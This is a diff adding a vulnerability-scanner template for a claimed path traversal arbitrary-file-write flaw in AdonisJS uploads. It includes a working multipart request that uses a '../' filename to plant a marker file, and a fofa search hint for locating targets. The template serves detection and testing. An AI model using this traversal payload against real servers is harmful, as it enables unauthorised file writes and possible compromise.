@@ -1,0 +1,35 @@
+id: adonisjs-upload-arbitrary-file-write
+
+info:
+  name: AdonisJS 多文件上传处理模块路径遍历漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: AdonisJS
+          AdonisJS作为TypeScript优先的Web框架，在其多文件上传处理模块中存在路径遍历安全缺陷。攻击者可利用该缺陷将恶意构造的文件写入服务器文件系统任意指定路径，实现非授权文件操作。该漏洞源于对上传文件路径的校验机制存在逻辑缺陷。
+  reference:
+  - CVE-2026-21440
+  tags: AdonisJS
+
+http:
+- raw:
+  - |
+    POST /upload HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----CVE2026214440Boundary
+    Connection: close
+
+    ----CVE2026214440Boundary
+    Content-Disposition: form-data; name="file"; filename="../NTest.txt"
+    Content-Type: application/octet-stream
+
+    NdayTest
+    ----CVE2026214440Boundary--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
